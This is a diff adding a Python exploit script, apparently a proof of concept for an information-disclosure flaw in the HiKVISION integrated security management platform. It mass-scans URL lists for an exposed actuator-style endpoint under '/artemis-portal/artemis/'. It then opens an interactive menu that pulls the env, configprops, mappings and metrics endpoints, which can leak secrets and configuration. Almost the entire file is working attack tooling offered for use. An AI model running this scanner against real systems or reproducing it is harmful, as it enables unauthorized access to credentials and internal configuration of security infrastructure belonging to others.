@@ -1,0 +1,97 @@
+import requests,argparse,sys,json,re,time,os
+from multiprocessing.dummy import Pool
+# 关闭警告
+requests.packages.urllib3.disable_warnings()
+
+
+# 横幅
+def banner():
+    test = """
+      _    _ _ _  ____      _______  _____ _____ ____  _   _ 
+ | |  | (_) |/ /\ \    / /_   _|/ ____|_   _/ __ \| \ | |
+ | |__| |_| ' /  \ \  / /  | | | (___   | || |  | |  \| |
+ |  __  | |  <    \ \/ /   | |  \___ \  | || |  | | . ` |
+ | |  | | | . \    \  /   _| |_ ____) |_| || |__| | |\  |
+ |_|  |_|_|_|\_\    \/   |_____|_____/|_____\____/|_| \_|  
+                                        author:hqy
+                                        version:1.0.0
+                                
+"""
+    print(test)
+
+
+def main():
+    banner()
+# 处理命令行参数
+    # 初始化 
+    parser = argparse.ArgumentParser(description="HiKVISION综合安防管理平台env信息泄漏")
+    
+    # 添加参数
+    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
+    parser.add_argument('-f','--file',dest='file',type=str,help='input your file')
+
+
+    args = parser.parse_args()
+
+    if args.url and not args.file:
+        if poc(args.url):
+            exp(args.url)
+    elif args.file and not args.url:
+        url_list = []
+        with open(args.file,'r',encoding='utf-8') as fp:
+            for url in fp.readlines():
+                url_list.append(url.strip())
+        mp = Pool(100)
+        mp.map(poc,url_list)
+        mp.close()
+        mp.join()
+    else:
+        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
+
+
+def poc(target):
+    payload = '/artemis-portal/artemis/loggers'
+    try:
+        res1 = requests.get(url=target+payload,verify=False,timeout=5)
+        if res1.status_code == 200:
+            print(f"[+]{target}存在漏洞")
+            return True
+        else:
+            print(f"[-]{target}不存在漏洞")
+    except:
+        pass
+
+def exp(target):
+    res = {
+        'payload1': '/artemis-portal/artemis/loggers',
+        'payload2': '/artemis-portal/artemis/env',
+        'payload3': '/artemis-portal/artemis/metrics',
+        'payload4': '/artemis-portal/artemis/metrics/http.server.requests',
+        'payload5': '/artemis-portal/artemis/configprops',
+        'payload6': '/artemis-portal/artemis/info',
+        'payload7': '/artemis-portal/artemis/mappings',
+        'payload8': '/artemis-portal/artemis/health',
+    }
+
+    print("正在努力给你搞一个shell...")
+    time.sleep(2)
+    os.system("cls")  # Clear the screen (for Windows; use "clear" for Unix-like systems)
+
+    while True:
+        cmd = input("请输入你要执行的命令：(payload1, payload2, payload3, payload4, payload5, payload6, payload7, payload8, q)")
+        if cmd == "q":
+            break
+        elif cmd in res:
+            try:
+                response = requests.get(url=target + res[cmd],verify=False)
+                print(response.text)
+            except requests.RequestException as e:
+                print(f"请求出错：{e}")
+        else:
+            print("无效的命令，请重新输入。")
+
+    print("退出程序。")
+
+# 函数入口
+if __name__ == "__main__":
+    main()
